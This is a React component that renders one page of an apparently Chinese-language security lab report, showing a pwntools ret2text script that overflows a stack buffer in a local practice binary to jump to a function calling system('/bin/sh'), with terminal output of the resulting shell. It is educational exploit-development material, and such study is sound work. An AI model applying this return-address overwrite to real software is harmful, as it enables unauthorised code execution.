import React from 'react';
import { A4Page } from '../shared';
import { KaliTerminal } from './Lab3Part1';

// 实验四 第四部分 - ret2text exp 和结果
export const Lab4Part4: React.FC = () => (
    <A4Page id="lab4-part4">
        <p className="text-sm mb-2">步骤5：编写漏洞利用脚本</p>
        <KaliTerminal>
{`# ret2text.py
from pwn import *

context(arch = "i386", os = "linux")
p = process("./ret2text")

padding2ebp = 0x10
func_addr = 0x08049186

payload = b"a" * (padding2ebp + 4) + p32(func_addr)

out = b"input:"
p.sendlineafter(out, payload)
p.interactive()`}
        </KaliTerminal>

        <p className="text-sm mb-2">步骤6：运行 exp 脚本</p>
        <KaliTerminal>
{`┌──(kali㉿kali)-[~/lab4]
└─$ python3 ret2text.py
[x] Starting local process './ret2text'
[+] Starting local process './ret2text': pid 260530
[*] Switching to interactive mode
$ whoami
kali
$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
$ exit
[*] Stopped process './ret2text' (pid 260530)`}
        </KaliTerminal>

        <p className="text-sm mb-3 text-justify leading-relaxed indent-8">
            ret2text 攻击成功。成功通过栈溢出覆盖返回地址，使程序跳转到 func 函数执行 system("/bin/sh")，
            获取了 shell。
        </p>
    </A4Page>
);

export default Lab4Part4;
